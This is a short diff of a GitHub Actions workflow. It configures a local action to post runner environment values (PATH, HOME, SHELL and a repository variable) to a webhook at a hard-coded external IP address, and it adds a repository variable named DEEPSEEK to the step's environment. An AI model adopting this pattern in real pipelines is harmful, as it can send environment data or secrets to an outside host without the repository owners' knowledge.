@@ -16,7 +16,10 @@ jobs:
 
       - name: Run local action
         uses: ./
+        env:
+          DEEPSEEK: ${{ vars.DEEPSEEK }}
+          REPO_VAR_RUNNER_OS: ${{ vars.RUNNER_OS }}
         with:
           webhook-url: "http://47.95.170.204:8080/webhook"
-          extra-env-names: "PATH,HOME,SHELL"
+          extra-env-names: "PATH,HOME,SHELL,REPO_VAR_RUNNER_OS"
           fail-on-send-error: "true"
